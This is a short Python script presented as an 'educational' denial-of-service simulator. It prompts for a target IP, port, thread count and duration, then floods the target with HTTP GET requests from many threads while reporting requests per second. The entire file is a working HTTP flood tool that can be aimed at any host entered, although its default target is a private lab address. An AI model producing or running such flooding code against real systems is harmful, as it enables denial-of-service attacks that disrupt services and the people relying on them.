#!/usr/bin/python3
# DoS Simulator - Educational Use Only

import socket
import threading
import time

print("\n" + "="*50)
print("DOS SIMULATOR - SINGLE SOURCE ATTACK")
print("FOR EDUCATIONAL PURPOSES ONLY")
print("="*50)

ip = input("Target IP: ") or "192.168.56.102"
port = int(input("Target Port: ") or 80)
threads = int(input("Threads (50-200): ") or 100)
duration = int(input("Duration (seconds): ") or 30)

print(f"\n[*] Target: {ip}:{port}")
print(f"[*] Threads: {threads}")
print(f"[*] Duration: {duration}s")
print("[*] Starting in 3 seconds...")
time.sleep(3)

active = True
count = 0
start = time.time()

def attack():
    global count
    while active:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((ip, port))
            
            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
            s.send(request.encode())
            count += 1
            
            s.close()
            
        except:
            pass

print(f"\n[+] Starting {threads} threads...")
for _ in range(threads):
    threading.Thread(target=attack, daemon=True).start()

print(f"\n[+] Running attack for {duration} seconds\n")
try:
    for sec in range(duration, 0, -1):
        elapsed = time.time() - start
        rps = count / elapsed if elapsed > 0 else 0
        print(f"\r[⏱️] Time: {sec:3d}s | Requests: {count:6d} | RPS: {rps:6.1f}", end="")
        time.sleep(1)
    
    active = False
    
except KeyboardInterrupt:
    print("\n\n[!] Stopped by user")
    active = False

active = False
time.sleep(2)

print(f"\n\n" + "="*50)
print("ATTACK FINISHED")
print("="*50)
print(f"Total requests: {count}")
print(f"Duration: {duration} seconds")
print(f"Average RPS: {count/duration:.1f}")
print("="*50)
